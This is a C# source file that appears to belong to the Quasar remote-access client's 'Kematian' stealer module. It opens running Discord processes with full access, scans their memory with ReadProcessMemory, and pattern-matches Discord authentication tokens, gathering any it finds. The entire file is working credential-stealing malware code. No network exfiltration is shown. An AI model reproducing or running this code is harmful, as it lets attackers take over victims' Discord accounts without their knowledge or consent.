using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Quasar.Client.Kematian.Discord.Methods.Memory
{
    public class GetTokensFromMemory
    {
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint PAGE_READABLE = 0x04 | 0x02 | 0x20;
        const int MAX_REGION_SIZE = 0x7FFFFFFF;
        const int BUFFER_SIZE = 1024 * 1024 * 4;

        static readonly byte[] SharedBuffer = new byte[BUFFER_SIZE];
        static readonly object BufferLock = new object();

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress,
            out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, long dwSize, out IntPtr lpNumberOfBytesRead);

        static bool IsValidChar(char c)
        {
            return (c >= 'a' && c <= 'z') ||
                   (c >= 'A' && c <= 'Z') ||
                   (c >= '0' && c <= '9') ||
                   c == '-' || c == '_';
        }

        static string ScanForFirstToken(string data)
        {
            int i = 0;
            int len = data.Length;

            while (i < len - 70) // Minimum token length is 26 + 1 + 6 + 1 + 38 = 72
            {
                // Fast-forward to potential start of token (valid char)
                while (i < len && !IsValidChar(data[i])) i++;

                if (i >= len - 70) break;

                // Check if we have a potential token
                int start = i;
                int validCount = 0;

                // Check first segment (26 chars)
                while (validCount < 26 && i < len && IsValidChar(data[i]))
                {
                    validCount++;
                    i++;
                }

                // If we don't have exactly 26 chars, or next char isn't dot, move on
                if (validCount != 26 || i >= len || data[i] != '.')
                {
                    i = start + 1;
                    continue;
                }
                i++; // Skip dot

                // Check second segment (6 chars)
                validCount = 0;
                while (validCount < 6 && i < len && IsValidChar(data[i]))
                {
                    validCount++;
                    i++;
                }

                // If we don't have exactly 6 chars, or next char isn't dot, move on
                if (validCount != 6 || i >= len || data[i] != '.')
                {
                    i = start + 1;
                    continue;
                }
                i++; // Skip dot

                // Check third segment (38 chars)
                validCount = 0;
                while (validCount < 38 && i < len && IsValidChar(data[i]))
                {
                    validCount++;
                    i++;
                }

                // If we have exactly 38 chars, we found a token
                if (validCount == 38)
                {
                    return data.Substring(start, 72); // 26 + 1 + 6 + 1 + 38 = 72
                }

                i = start + 1;
            }

            return null;
        }

        static string ProcessMemoryChunk(byte[] buffer, int bytesRead)
        {
            try
            {
                string decodedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                return ScanForFirstToken(decodedData);
                
            }
            catch
            {
                return null;
            }
        }

        static string DumpMemory(int pid)
        {
            IntPtr handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

            if (handle == IntPtr.Zero)
            {
                Console.WriteLine($"Failed to open process {pid}");
                return null;
            }

            try
            {
                IntPtr address = IntPtr.Zero;
                var memInfo = new MEMORY_BASIC_INFORMATION();
                int memInfoSize = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));

                while (true)
                {
                    int result = VirtualQueryEx(handle, address, out memInfo, (uint)memInfoSize);
                    if (result == 0) break;

                    if (memInfo.State == MEM_COMMIT && (memInfo.Protect & PAGE_READABLE) != 0)
                    {
                        long regionSize = memInfo.RegionSize.ToInt64();
                        if (regionSize > 0 && regionSize < MAX_REGION_SIZE)
                        {
                            for (long offset = 0; offset < regionSize; offset += BUFFER_SIZE)
                            {
                                int chunkSize = (int)Math.Min(BUFFER_SIZE, regionSize - offset);

                                lock (BufferLock)
                                {
                                    var baseAddress = IntPtr.Add(memInfo.BaseAddress, (int)offset);

                                    if (ReadProcessMemory(handle, baseAddress, SharedBuffer, chunkSize, out IntPtr bytesRead))
                                    {
                                        int actualBytesRead = bytesRead.ToInt32();
                                        if (actualBytesRead > 0)
                                        {
                                            string match = ProcessMemoryChunk(SharedBuffer, actualBytesRead);
                                            if (match != null)
                                            {
                                                return match; // Exit as soon as we find a match
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }

                    try
                    {
                        long nextAddress = memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64();
                        if (nextAddress < 0) break;
                        address = new IntPtr(nextAddress);
                    }
                    catch (OverflowException)
                    {
                        break;
                    }
                }
            }
            finally
            {
                CloseHandle(handle);
            }

            return null;
        }

        static string[] GetTokens(string[] args)
        {
            var processes = Process.GetProcessesByName("discord");

            List<string> tokens = new List<string>();

            foreach (var process in processes)
            {
                try
                {
                    var startTime = DateTime.Now;
                    var result = DumpMemory(process.Id);
                    var duration = DateTime.Now - startTime;

                    if (result != null)
                    {
                        Debug.WriteLine($"Found token in {duration.TotalSeconds:F2} seconds:");
                        tokens.Add(result);
                        Debug.WriteLine(result);
                    }
                    else
                    {
                        Debug.WriteLine($"No tokens found in {duration.TotalSeconds:F2} seconds");
                    }
                }
                catch (Exception e)
                {
                    Debug.WriteLine($"Error with PID {process.Id}: {e.Message}");
                }
            }

            return tokens.ToArray();
        }
    }
}